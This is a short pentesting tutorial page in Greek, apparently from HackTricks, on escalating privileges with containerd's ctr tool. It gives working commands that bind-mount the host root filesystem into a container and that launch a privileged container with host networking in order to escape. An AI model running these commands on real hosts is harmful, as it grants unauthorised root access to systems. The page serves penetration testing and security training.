# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Μεταβείτε στον παρακάτω σύνδεσμο για να μάθετε **πού εντάσσονται τα `containerd` και `ctr` στο container stack**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

αν διαπιστώσετε ότι ένας host περιέχει την εντολή `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Μπορείτε να παραθέσετε τις εικόνες:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Και στη συνέχεια **εκτελέστε μία από αυτές τις images προσαρτώντας σε αυτήν τον root φάκελο του host**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Εκτέλεσε ένα privileged container και κάνε escape από αυτό.\
Μπορείς να εκτελέσεις ένα privileged container ως εξής:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε ορισμένες από τις τεχνικές που αναφέρονται στην ακόλουθη σελίδα για να **escape από αυτό, κάνοντας abuse privileged capabilities**:

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
